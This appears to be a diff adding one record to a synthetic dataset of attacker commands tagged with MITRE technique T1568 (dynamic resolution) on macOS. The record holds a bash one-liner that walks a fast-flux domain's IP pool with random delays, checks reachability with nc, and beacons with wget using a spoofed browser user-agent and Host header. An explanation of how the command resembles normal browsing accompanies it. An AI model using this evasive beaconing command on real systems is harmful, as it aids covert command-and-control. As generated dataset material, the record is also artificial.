@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "dom=\"static-assets-cache.net\"; ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; for ip in $(dig +short A \"$dom\"); do sleep $((RANDOM%4+1)); if nc -z -G 2 \"$ip\" 80 >/dev/null 2>&1; then wget -q --header=\"Host: $dom\" --user-agent=\"$ua\" --timeout=6 --tries=1 --header=\"Accept: text/html\" \"http://$ip/index.html\" -O - | grep -q \"</html>\" && break; fi; done",
+  "explanation": "Iterates across all resolved A records (fast-flux pool) with randomized delays and only contacts reachable IPs, using Host header and HTML path to resemble standard browsing.",
+  "rationale_steps": [
+    "Resolve current A records to build a fast-flux candidate set.",
+    "Randomize timing and validate TCP reachability before beaconing.",
+    "Fetch HTML content with realistic headers and break on success."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-cffb1c07",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
